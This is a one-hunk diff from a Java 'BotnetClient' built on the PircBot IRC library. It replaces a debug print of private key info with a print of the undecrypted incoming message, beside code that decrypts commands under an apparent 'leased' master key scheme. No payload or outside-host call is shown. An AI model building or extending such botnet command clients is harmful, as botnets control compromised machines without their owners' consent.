@@ -101,7 +101,7 @@ public class BotnetClient extends PircBot {
 			leasedM = null;
 			leaseMaster = null;
 		}
-		System.out.println("key info: " + m.getPriv());
+		System.out.println("unenc on clientside: " + message);
 		String decMsg = m.decryptMsgNonce(message);
 		System.out.println("m1: " + decMsg);
 		String leasedDecMsg = leased ? leasedM.decryptMsgNonce(message) : null;
